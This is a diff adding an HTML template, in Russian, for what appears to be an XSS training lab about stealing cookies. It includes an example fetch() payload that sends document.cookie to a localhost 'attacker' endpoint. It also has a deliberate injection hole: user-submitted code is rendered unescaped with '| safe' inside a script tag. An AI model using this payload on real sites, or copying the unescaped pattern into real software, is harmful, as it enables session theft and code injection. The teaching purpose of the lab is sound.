@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Уязвимая страница</title>
+    <link rel="stylesheet" href="CSS/styles.css">
+</head>
+<body>
+    <header>
+        <h1>XSS - Уязвимая страница</h1>
+    </header>
+
+    {% include 'nav.html' %}
+
+    <div class="task-section">
+        <h2>Задание: Кража куки через XSS</h2>
+        <p>Вы авторизованы как <strong>{{ username }}</strong>.</p>
+        <p>Эта страница уязвима к XSS. Напишите JS-код эксплойта, чтобы украсть куки пользователя и сессионный токен.</p>
+    </div>
+
+    <div class="answer-form">
+        <h2>XSS Эксплойт</h2>
+        <form method="POST">
+            <textarea name="code" class="input-field" rows="5" placeholder="Введите ваш JS-код эксплойта здесь"></textarea>
+            <button type="submit" class="submit-btn">Выполнить код</button>
+        </form>
+        <p>Пример кода для кражи куки и сессионного токена:
+            <code>
+                fetch('http://localhost:8080/attacker/xss/steal?cookie=' + encodeURIComponent(document.cookie), { credentials: 'include', mode: 'cors' });
+            </code>
+        </p>
+    </div>
+
+    {% if message %}
+    <div class="message-box">
+        <p>Результат выполнения кода:</p>
+        <pre>{{ message }}</pre>
+    </div>
+    <script>
+        // Выполняем введённый код (имитация XSS-уязвимости)
+        try {
+            {{ code | safe }}
+        } catch (e) {
+            console.error("Ошибка выполнения кода:", e);
+        }
+    </script>
+    {% endif %}
+</body>
+</html>
